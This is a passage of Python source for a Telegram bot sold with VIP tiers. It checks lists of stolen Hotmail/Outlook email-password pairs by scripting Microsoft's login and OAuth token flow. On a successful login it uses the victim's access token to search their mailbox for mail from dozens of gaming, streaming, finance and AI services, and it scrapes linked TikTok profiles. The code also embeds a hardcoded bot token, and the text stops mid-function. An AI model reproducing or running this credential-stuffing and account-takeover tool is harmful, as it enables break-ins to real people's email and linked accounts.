#ASSLAM ALIKUM 
"""
HOTMAIL CHECKER TELEGRAM BOT - ULTIMATE VERSION
Created by: @pyabrodies for Mahdi
✅ TikTok Full Capture (VIP Only)
✅ AI Platforms Check (Free)
✅ Ban System
✅ Advanced Statistics
✅ Stop Button
✅ All Previous Features
"""

import telebot
from telebot import types
import sqlite3
import os
import time
import threading
import datetime
import json
import requests
import uuid
import re
import urllib.parse
from pathlib import Path

# TikTok Capture Module
USER_AGENTS_TIKTOK = [
    'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

def format_number(num):
    """Format large numbers"""
    if num >= 1000000:
        return f"{num/1000000:.1f}M"
    elif num >= 1000:
        return f"{num/1000:.1f}K"
    else:
        return str(num)

# Bot Configuration
BOT_TOKEN = "8120909812:AAH90GJgbbKZVH4qlswEgRyBx_aBtOsqGj4"
ADMIN_ID = 6892108222
MY_SIGNATURE = "@pyabrodies"
CHANNEL = "https://t.me/HoTmIlToOLs"

bot = telebot.TeleBot(BOT_TOKEN)

# User session storage
user_sessions = {}
active_scans = {}  # Track active scans for stop functionality

# Services Configuration
SERVICES_ALL = {
    # Social Media
    "Facebook": "security@facebookmail.com",
    "Instagram": "security@mail.instagram.com",
    "TikTok": "register@account.tiktok.com",
    "Twitter": "info@x.com",
    "LinkedIn": "security-noreply@linkedin.com",
    "Snapchat": "no-reply@accounts.snapchat.com",
    
    # Streaming
    "Netflix": "info@account.netflix.com",
    "Spotify": "no-reply@spotify.com",
    "Disney+": "no-reply@disneyplus.com",
    "Hulu": "account@hulu.com",
    "YouTube": "no-reply@youtube.com",
    
    # Gaming
    "Steam": "noreply@steampowered.com",
    "Xbox": "xboxreps@engage.xbox.com",
    "PlayStation": "reply@txn-email.playstation.com",
    "Epic Games": "help@acct.epicgames.com",
    "Roblox": "accounts@roblox.com",
    "Free Fire": "no-reply@garena.com",
    "PUBG Mobile": "noreply@pubgmobile.com",
    "Konami": "noreply@konami.net",
    
    # Finance
    "PayPal": "service@paypal.com.br",
    "Binance": "do-not-reply@ses.binance.com",
    "Coinbase": "no-reply@coinbase.com",
}

SERVICES_GAMING = {
    "Steam": "noreply@steampowered.com",
    "Xbox": "xboxreps@engage.xbox.com",
    "PlayStation": "reply@txn-email.playstation.com",
    "Epic Games": "help@acct.epicgames.com",
    "EA Sports": "EA@e.ea.com",
    "Ubisoft": "noreply@ubisoft.com",
    "Riot Games": "no-reply@riotgames.com",
    "Roblox": "accounts@roblox.com",
    "Minecraft": "noreply@mojang.com",
    "Free Fire": "no-reply@garena.com",
    "PUBG Mobile": "noreply@pubgmobile.com",
    "Konami": "noreply@konami.net",
}

SERVICES_SOCIAL = {
    "Facebook": "security@facebookmail.com",
    "Instagram": "security@mail.instagram.com",
    "TikTok": "register@account.tiktok.com",
    "Twitter": "info@x.com",
    "LinkedIn": "security-noreply@linkedin.com",
    "Snapchat": "no-reply@accounts.snapchat.com",
    "Discord": "noreply@discord.com",
}

SERVICES_STREAMING = {
    "Netflix": "info@account.netflix.com",
    "Spotify": "no-reply@spotify.com",
    "Disney+": "no-reply@disneyplus.com",
    "Hulu": "account@hulu.com",
    "HBO Max": "no-reply@hbomax.com",
    "Amazon Prime": "auto-confirm@amazon.com",
    "YouTube": "no-reply@youtube.com",
    "Twitch": "no-reply@twitch.tv",
}

# AI Platforms (Free for everyone)
SERVICES_AI = {
    "ChatGPT": "support@openai.com",
    "Claude AI": "support@anthropic.com",
    "Gemini": "ai-support@google.com",
    "DeepSeek": "support@deepseek.com",
    "Blackbox AI": "support@blackbox.ai",
    "Perplexity": "support@perplexity.ai",
    "Meta AI": "ai@meta.com",
    "Copilot": "copilot@microsoft.com",
    "Stability AI": "support@stability.ai",
}

# Database Setup
def init_db():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        is_vip INTEGER DEFAULT 0,
        vip_until TEXT,
        is_banned INTEGER DEFAULT 0,
        ban_reason TEXT,
        referral_code TEXT UNIQUE,
        referred_by INTEGER,
        referrals_count INTEGER DEFAULT 0,
        last_scan_time TEXT,
        total_scans INTEGER DEFAULT 0,
        total_hits INTEGER DEFAULT 0,
        join_date TEXT
    )''')
    
    # Scans history
    c.execute('''CREATE TABLE IF NOT EXISTS scans (
        scan_id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        scan_date TEXT,
        scan_mode TEXT,
        hits_count INTEGER,
        bad_count INTEGER,
        total_checked INTEGER
    )''')
    
    conn.commit()
    conn.close()

init_db()

# Database Helper Functions
def get_user(user_id):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def add_user(user_id, username):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    
    user = get_user(user_id)
    if not user:
        # Generate unique referral code
        referral_code = f"REF{user_id}"
        c.execute("""INSERT INTO users (user_id, username, referral_code, join_date) 
                     VALUES (?, ?, ?, ?)""", 
                  (user_id, username, referral_code, str(datetime.datetime.now())))
        conn.commit()
    conn.close()

def add_vip_hours(user_id, hours):
    """Add VIP hours (for referral system)"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    
    user = get_user(user_id)
    if not user:
        return False
    
    current_vip = user[3]  # vip_until
    now = datetime.datetime.now()
    
    if current_vip == "Forever":
        new_vip = "Forever"
    elif current_vip:
        try:
            vip_date = datetime.datetime.strptime(current_vip, "%Y-%m-%d %H:%M:%S")
            if vip_date > now:
                # Extend existing VIP
                new_vip = vip_date + datetime.timedelta(hours=hours)
            else:
                # VIP expired, start new
                new_vip = now + datetime.timedelta(hours=hours)
        except:
            new_vip = now + datetime.timedelta(hours=hours)
    else:
        # No VIP, start new
        new_vip = now + datetime.timedelta(hours=hours)
    
    c.execute("UPDATE users SET is_vip = 1, vip_until = ? WHERE user_id = ?", 
              (str(new_vip), user_id))
    conn.commit()
    conn.close()
    return True

def process_referral(new_user_id, referrer_user_id):
    """Process referral - Give 1 hour VIP to referrer"""
    if referrer_user_id == new_user_id:
        return False
    
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    
    # Check if new user already has referred_by set
    new_user = get_user(new_user_id)
    if new_user and new_user[7]:  # referred_by already set
        conn.close()
        return False
    
    # Update referred_by for new user
    c.execute("UPDATE users SET referred_by = ? WHERE user_id = ?", 
              (referrer_user_id, new_user_id))
    
    # Increment referral count for referrer
    c.execute("UPDATE users SET referrals_count = referrals_count + 1 WHERE user_id = ?", 
              (referrer_user_id,))
    
    conn.commit()
    conn.close()
    
    # Add 1 hour VIP to referrer
    add_vip_hours(referrer_user_id, 1)
    return True

def is_banned(user_id):
    """Check if user is banned"""
    if user_id == ADMIN_ID:
        return False
    
    user = get_user(user_id)
    if not user:
        return False
    
    return user[4] == 1  # is_banned column

def ban_user(user_id, reason="No reason provided"):
    """Ban a user"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 1, ban_reason = ? WHERE user_id = ?", 
              (reason, user_id))
    conn.commit()
    conn.close()

def unban_user(user_id):
    """Unban a user"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 0, ban_reason = NULL WHERE user_id = ?", 
              (user_id,))
    conn.commit()
    conn.close()

def get_banned_users():
    """Get list of banned users"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id, username, ban_reason FROM users WHERE is_banned = 1")
    banned = c.fetchall()
    conn.close()
    return banned

def is_vip(user_id):
    # Admin is always VIP
    if user_id == ADMIN_ID:
        return True
    
    user = get_user(user_id)
    if not user:
        return False
    
    is_vip_flag = user[2]
    vip_until = user[3]
    
    # If not marked as VIP at all
    if is_vip_flag == 0 or not is_vip_flag:
        return False
    
    # If no vip_until date set but marked as VIP, treat as expired
    if not vip_until or vip_until.strip() == "":
        # Reset VIP status
        conn = sqlite3.connect('bot_database.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("UPDATE users SET is_vip = 0 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        return False
    
    # If Forever VIP
    if vip_until == "Forever":
        return True
    
    # Check if VIP is still valid
    try:
        vip_date = datetime.datetime.strptime(vip_until, "%Y-%m-%d %H:%M:%S")
        if datetime.datetime.now() < vip_date:
            return True
        else:
            # VIP expired - update database
            conn = sqlite3.connect('bot_database.db', check_same_thread=False)
            c = conn.cursor()
            c.execute("UPDATE users SET is_vip = 0 WHERE user_id = ?", (user_id,))
            conn.commit()
            conn.close()
            return False
    except Exception as e:
        # Invalid date format - reset VIP
        conn = sqlite3.connect('bot_database.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("UPDATE users SET is_vip = 0 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        return False

def is_vip_forever(user_id):
    """Check if user has FOREVER VIP (for TikTok Full Capture)"""
    if user_id == ADMIN_ID:
        return True
    
    user = get_user(user_id)
    if not user:
        return False
    
    vip_until = user[3]
    return vip_until == "Forever"

def can_scan(user_id):
    """Check if user can scan"""
    if is_vip(user_id):
        return True, None
    
    user = get_user(user_id)
    if not user or not user[6]:  # last_scan_time
        return True, None
    
    try:
        last_scan = datetime.datetime.strptime(user[6], "%Y-%m-%d %H:%M:%S")
        now = datetime.datetime.now()
        diff = (now - last_scan).total_seconds()
        
        if diff >= 3600:
            return True, None
        else:
            remaining = int(3600 - diff)
            minutes = remaining // 60
            seconds = remaining % 60
            return False, f"{minutes}m {seconds}s"
    except:
        return True, None

def update_last_scan(user_id):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET last_scan_time = ? WHERE user_id = ?", 
              (str(datetime.datetime.now()), user_id))
    conn.commit()
    conn.close()

def add_vip(user_id, username, duration):
    """Add VIP membership"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    
    user = get_user(user_id)
    if not user:
        add_user(user_id, username)
    
    if duration == "Forever":
        vip_until = "Forever"
    else:
        now = datetime.datetime.now()
        if duration == "1h":
            vip_until = now + datetime.timedelta(hours=1)
        elif duration == "1d":
            vip_until = now + datetime.timedelta(days=1)
        elif duration == "1w":
            vip_until = now + datetime.timedelta(weeks=1)
        elif duration == "1m":
            vip_until = now + datetime.timedelta(days=30)
        else:
            vip_until = "Forever"
        
        vip_until = str(vip_until)
    
    c.execute("UPDATE users SET is_vip = 1, vip_until = ? WHERE user_id = ?", 
              (vip_until, user_id))
    conn.commit()
    conn.close()

def remove_vip(user_id):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET is_vip = 0, vip_until = NULL WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def get_all_vips():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id, username, vip_until FROM users WHERE is_vip = 1")
    vips = c.fetchall()
    conn.close()
    return vips

def get_free_users():
    """Get list of free users"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id, username FROM users WHERE is_vip = 0 AND is_banned = 0")
    free_users = c.fetchall()
    conn.close()
    return free_users

def update_stats(user_id, hits, bad, total):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    
    c.execute("UPDATE users SET total_scans = total_scans + 1, total_hits = total_hits + ? WHERE user_id = ?", 
              (hits, user_id))
    
    conn.commit()
    conn.close()

# Main Menu Keyboard
def main_menu_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    btn1 = types.KeyboardButton("📋 Start Scan")
    btn2 = types.KeyboardButton("📦 Multi Scan")
    btn3 = types.KeyboardButton("📊 My Stats")
    btn4 = types.KeyboardButton("👑 Membership")
    btn5 = types.KeyboardButton("🔗 My Referral")
    btn6 = types.KeyboardButton("📞 Support")
    
    if user_id == ADMIN_ID:
        btn7 = types.KeyboardButton("🔧 Admin Panel")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    else:
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    return markup

# Scan Mode Selection
def scan_mode_keyboard(user_id):
    """Enhanced scan mode with Check One Account and Instagram Full"""
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    btn1 = types.InlineKeyboardButton("1️⃣ All Services", callback_data="scan_all")
    btn2 = types.InlineKeyboardButton("2️⃣ Select Single Platform", callback_data="scan_single_platform")
    btn3 = types.InlineKeyboardButton("3️⃣ Gaming Platforms", callback_data="scan_gaming")
    btn4 = types.InlineKeyboardButton("4️⃣ Social Media", callback_data="scan_social")
    btn5 = types.InlineKeyboardButton("5️⃣ Streaming Services", callback_data="scan_streaming")
    btn6 = types.InlineKeyboardButton("6️⃣ PSN Detailed", callback_data="scan_psn")
    btn7 = types.InlineKeyboardButton("7️⃣ Custom Domain", callback_data="scan_custom")
    btn8 = types.InlineKeyboardButton("8️⃣ AI Platforms (Free)", callback_data="scan_ai")
    
    # TikTok Full Capture - VIP FOREVER Only
    if is_vip_forever(user_id):
        btn9 = types.InlineKeyboardButton("9️⃣ TikTok Full Capture (VIP Forever)", callback_data="scan_tiktok")
    else:
        btn9 = types.InlineKeyboardButton("🔒 TikTok Full (VIP Forever Only)", callback_data="vip_forever_required")
    
    # NEW: Check One Account
    btn10 = types.InlineKeyboardButton("🔟 Check One Account", callback_data="scan_check_one")
    
    # NEW: Instagram Full Capture - VIP only
    if is_vip(user_id):
        btn11 = types.InlineKeyboardButton("1️⃣1️⃣ Instagram Full Capture (VIP)", callback_data="scan_instagram_full")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11)
    else:
        btn11 = types.InlineKeyboardButton("🔒 Instagram Full (VIP Only)", callback_data="vip_required")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11)
    
    btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="back_main")
    markup.add(btn_back)
    
    return markup


def single_platform_keyboard():
    """Platform selection keyboard - ALL platforms from source"""
    markup = types.InlineKeyboardMarkup(row_width=3)
    
    # Get ALL unique platforms from all service categories
    all_platforms = {}
    
    # Add from SERVICES_ALL
    for name, email in SERVICES_ALL.items():
        all_platforms[name] = email
    
    # Add from SERVICES_GAMING (if not already present)
    for name, email in SERVICES_GAMING.items():
        if name not in all_platforms:
            all_platforms[name] = email
    
    # Add from SERVICES_SOCIAL
    for name, email in SERVICES_SOCIAL.items():
        if name not in all_platforms:
            all_platforms[name] = email
    
    # Add from SERVICES_STREAMING
    for name, email in SERVICES_STREAMING.items():
        if name not in all_platforms:
            all_platforms[name] = email
    
    # Add from SERVICES_AI
    for name, email in SERVICES_AI.items():
        if name not in all_platforms:
            all_platforms[name] = email
    
    # Create buttons for all platforms (sorted alphabetically)
    platform_buttons = []
    for platform_name in sorted(all_platforms.keys()):
        # Create simple button with platform name
        btn_text = platform_name
        btn_data = f"platform_{platform_name}"
        platform_buttons.append(types.InlineKeyboardButton(btn_text, callback_data=btn_data))
    
    # Add buttons in rows of 3
    for i in range(0, len(platform_buttons), 3):
        row = platform_buttons[i:i+3]
        markup.row(*row)
    
    # Back button
    back_btn = types.InlineKeyboardButton("◀️ Back", callback_data="back_to_scan_modes")
    markup.add(back_btn)
    
    return markup

def get_mode_description(mode):
    """Get detailed description for each scan mode"""
    descriptions = {
        "all": """
⚡ <b>ALL SERVICES SCAN</b>

📝 <b>Description:</b>
Check ALL linked accounts across 60+ platforms

🎯 <b>Supported Platforms:</b>
• 📱 Social: Facebook, Instagram, TikTok, Twitter, LinkedIn
• 🎮 Gaming: Steam, Xbox, PSN, Epic, Free Fire, PUBG, Konami
• 📺 Streaming: Netflix, Spotify, Disney+, Hulu, HBO Max
• 💰 Finance: PayPal, Binance, Coinbase
• And 40+ more!

⏱ <b>Estimated Time:</b> Medium-Long
🎯 <b>Best For:</b> Complete account analysis
""",
        "gaming": """
⚡ <b>GAMING PLATFORMS SCAN</b>

📝 <b>Description:</b>
Check gaming accounts only - faster & focused

🎮 <b>Supported Platforms:</b>
• Steam, Xbox, PlayStation, Epic Games
• EA Sports, Ubisoft, Riot Games
• Roblox, Minecraft
• Free Fire, PUBG Mobile, Konami

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Gaming account hunters
""",
        "social": """
⚡ <b>SOCIAL MEDIA SCAN</b>

📝 <b>Description:</b>
Check social media accounts only

📱 <b>Supported Platforms:</b>
• Facebook, Instagram, TikTok
• Twitter, LinkedIn, Snapchat
• Discord, Reddit

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Social media hunters
""",
        "streaming": """
⚡ <b>STREAMING SERVICES SCAN</b>

📝 <b>Description:</b>
Check streaming & entertainment

📺 <b>Supported Platforms:</b>
• Netflix, Spotify, Disney+
• Hulu, HBO Max, Amazon Prime
• YouTube Premium, Twitch

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Entertainment hunters
""",
        "psn": """
⚡ <b>PSN DETAILED SCAN</b>

📝 <b>Description:</b>
Deep PlayStation Network analysis

🎯 <b>What You Get:</b>
• PSN verification
• Order history
• Online ID extraction
• Account region

⏱ <b>Estimated Time:</b> Medium
🎯 <b>Best For:</b> PlayStation focus
""",
        "custom": """
⚡ <b>CUSTOM DOMAIN SCAN</b>

📝 <b>Description:</b>
Search for ANY service by domain

🔍 <b>How It Works:</b>
Provide domain (e.g., netflix.com)
Bot searches emails from that domain

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Specific services
""",
        "ai": """
⚡ <b>AI PLATFORMS SCAN</b> 🆕

📝 <b>Description:</b>
Check AI platform accounts (FREE!)

🤖 <b>Supported Platforms:</b>
• ChatGPT (OpenAI)
• Claude AI (Anthropic)
• Gemini (Google)
• DeepSeek AI
• Blackbox AI
• Perplexity AI
• Meta AI (LLaMA)
• Microsoft Copilot
• Stability AI

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> AI account hunters
💎 <b>Status:</b> FREE for everyone!
""",
        "tiktok": """
⚡ <b>TIKTOK FULL CAPTURE</b> 🆕

📝 <b>Description:</b>
Complete TikTok account data extraction

🎯 <b>What You Get:</b>
• TikTok Username
• Followers Count
• Following Count
• Total Videos
• Total Likes
• Profile Bio
• Verification Status
• Account Creation Date

⏱ <b>Estimated Time:</b> Medium
🎯 <b>Best For:</b> TikTok hunters
👑 <b>Status:</b> VIP ONLY
"""
    }
    
    return descriptions.get(mode, "")

# Admin Panel
def admin_panel_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # VIP Management
    btn1 = types.InlineKeyboardButton("➕ Add VIP", callback_data="admin_add_vip")
    btn2 = types.InlineKeyboardButton("➖ Remove VIP", callback_data="admin_remove_vip")
    btn3 = types.InlineKeyboardButton("📋 List VIPs", callback_data="admin_list_vips")
    
    # Ban Management
    btn4 = types.InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban_user")
    btn5 = types.InlineKeyboardButton("✅ Unban User", callback_data="admin_unban_user")
    btn6 = types.InlineKeyboardButton("📋 Banned List", callback_data="admin_banned_list")
    
    # Statistics
    btn7 = types.InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")
    btn8 = types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    
    btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="back_main")
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn_back)
    return markup

# VIP Duration Selection
def vip_duration_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn1 = types.InlineKeyboardButton("⏱ 1 Hour", callback_data="vip_duration_1h")
    btn2 = types.InlineKeyboardButton("📅 1 Day", callback_data="vip_duration_1d")
    btn3 = types.InlineKeyboardButton("📆 1 Week", callback_data="vip_duration_1w")
    btn4 = types.InlineKeyboardButton("🗓 1 Month", callback_data="vip_duration_1m")
    btn5 = types.InlineKeyboardButton("♾️ Forever", callback_data="vip_duration_forever")
    btn_back = types.InlineKeyboardButton("◀️ Cancel", callback_data="admin_panel")
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn_back)
    return markup

# Stop Button for Progress Message
def stop_scan_keyboard(user_id):
    markup = types.InlineKeyboardMarkup()
    btn_stop = types.InlineKeyboardButton("⏹ Stop Scan", callback_data=f"stop_scan_{user_id}")
    markup.add(btn_stop)
    return markup

# =====================================================
# HOTMAIL CHECKER ENGINE
# =====================================================

class HotmailChecker:
    """Real Hotmail/Outlook Checker"""
    
    @staticmethod
    def check_account(email, password):
        """Check if account is valid"""
        try:
            session = requests.Session()
            
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)",
            }
            
            r1 = session.get(url1, headers=headers1, timeout=10)
            
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}
            
            params = {
                "client_info": "1",
                "haschrome": "1",
                "login_hint": email,
                "mkt": "en",
                "response_type": "code",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
            }
            
            url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
            r2 = session.get(url_auth, timeout=10)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                return {"status": "BAD"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&i19=9960"
            
            r3 = session.post(post_url, data=login_data, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0"
            }, allow_redirects=False, timeout=10)
            
            if "password is incorrect" in r3.text.lower() or "error" in r3.text.lower():
                return {"status": "BAD"}
            
            location = r3.headers.get("Location", "")
            if not location or "code=" not in location:
                return {"status": "BAD"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}
            
            code = code_match.group(1)
            
            token_data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                            data=token_data, timeout=10)
            
            if "access_token" not in r4.text:
                return {"status": "BAD"}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            mspcid = None
            for cookie in session.cookies:
                if cookie.name == "MSPCID":
                    mspcid = cookie.value.upper()
                    break
            
            if not mspcid:
                mspcid = str(uuid.uuid4()).upper()
            
            return {
                "status": "HIT",
                "token": access_token,
                "cid": mspcid
            }
            
        except:
            return {"status": "RETRY"}
    
    @staticmethod
    def check_services(email, password, token, cid, services_dict):
        """Check for linked services"""
        found_services = []
        
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com"
            }
            
            for service_name, sender_email in services_dict.items():
                try:
                    payload = {
                        "Cvid": str(uuid.uuid4()),
                        "Scenario": {"Name": "owa.react"},
                        "TimeZone": "UTC",
                        "TextDecorations": "Off",
                        "EntityRequests": [{
                            "EntityType": "Conversation",
                            "ContentSources": ["Exchange"],
                            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                            "From": 0,
                            "Query": {"QueryString": f"from:{sender_email}"},
                            "Size": 1,
                            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                        }]
                    }
                    
                    r = requests.post(search_url, json=payload, headers=headers, timeout=8)
                    
                    if r.status_code == 200:
                        data = r.json()
                        if 'EntitySets' in data:
                            for entity_set in data['EntitySets']:
                                if 'ResultSets' in entity_set:
                                    for result_set in entity_set['ResultSets']:
                                        total = result_set.get('Total', 0)
                                        if total > 0:
                                            found_services.append(service_name)
                                            break
                    
                    time.sleep(0.1)
                except:
                    continue
            
            return found_services
        except:
            return found_services
    
    @staticmethod
    def check_tiktok_full(email, password, token, cid):
        """TikTok Full Capture - Extract COMPLETE TikTok data"""
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }
            
            # Search for TikTok emails
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Message",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": "tiktok"},
                    "Size": 25,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            r = requests.post(search_url, json=payload, headers=headers, timeout=15)
            
            if r.status_code != 200:
                return None
            
            search_text = r.text
            
            # Count TikTok emails
            tiktok_senders = [
                "no-reply@shop.tiktok.com",
                "notification@service.tiktok.com",
                "noreply@account.tiktok.com",
                "register@account.tiktok.com",
                "no-reply@tiktok.com",
            ]
            
            tiktok_count = 0
            for sender in tiktok_senders:
                tiktok_count += search_text.count(sender)
            
            if tiktok_count == 0:
                return None
            
            # Extract username from emails
            username_patterns = [
                r'(?i)this\s+email\s+was\s+generated\s+for\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'(?i)Hi\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'(?i)Hello\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'@([a-zA-Z0-9_\.]{2,30})',
            ]
            
            username = None
            for pattern in username_patterns:
                match = re.search(pattern, search_text)
                if match:
                    potential_username = match.group(1)
                    if not any(x in potential_username.lower() for x in ['tiktok', 'mail', 'email', 'hotmail', 'outlook']):
                        username = potential_username
                        break
            
            if not username:
                return {
                    "has_tiktok": True,
                    "tiktok_emails": tiktok_count,
                    "username": "Unknown",
                    "followers": 0,
                    "following": 0,
                    "videos": 0,
                    "likes": 0,
                    "verified": False
                }
            
            # Fetch TikTok profile data
            try:
                import random
                headers_tiktok = {
                    'user-agent': random.choice(USER_AGENTS_TIKTOK),
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                }
                
                url = f"https://www.tiktok.com/@{username}"
                response = requests.get(url, headers=headers_tiktok, timeout=10, verify=False)
                
                if response.status_code == 200:
                    html = response.text
                    
                    # Extract data from HTML
                    profile_data = {
                        "has_tiktok": True,
                        "tiktok_emails": tiktok_count,
                        "username": username,
                        "followers": 0,
                        "following": 0,
                        "videos": 0,
                        "likes": 0,
                        "verified": False
                    }
                    
                    # Try JSON extraction first
                    json_pattern = r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__" type="application/json">(.*?)</script>'
                    json_match = re.search(json_pattern, html, re.DOTALL)
                    
                    if json_match:
                        try:
                            data = json.loads(json_match.group(1))
                            user_detail = data.get('__DEFAULT_SCOPE__', {}).get('webapp.user-detail', {}).get('userInfo', {})
                            user = user_detail.get('user', {})
                            stats = user_detail.get('stats', {})
                            
                            profile_data['followers'] = stats.get('followerCount', 0)
                            profile_data['following'] = stats.get('followingCount', 0)
                            profile_data['likes'] = stats.get('heartCount', 0)
                            profile_data['videos'] = stats.get('videoCount', 0)
                            profile_data['verified'] = user.get('verified', False)
                        except:
                            pass
                    
                    # Fallback: Regex extraction
                    if profile_data['followers'] == 0:
                        followers_match = re.search(r'"followerCount":(\d+)', html)
                        if followers_match:
                            profile_data['followers'] = int(followers_match.group(1))
                    
                    if profile_data['following'] == 0:
                        following_match = re.search(r'"followingCount":(\d+)', html)
                        if following_match:
                            profile_data['following'] = int(following_match.group(1))
                    
                    if profile_data['videos'] == 0:
                        videos_match = re.search(r'"videoCount":(\d+)', html)
                        if videos_match:
                            profile_data['videos'] = int(videos_match.group(1))
                    
                    if profile_data['likes'] == 0:
                        likes_match = re.search(r'"heartCount":(\d+)', html)
                        if likes_match:
                            profile_data['likes'] = int(likes_match.group(1))
                    
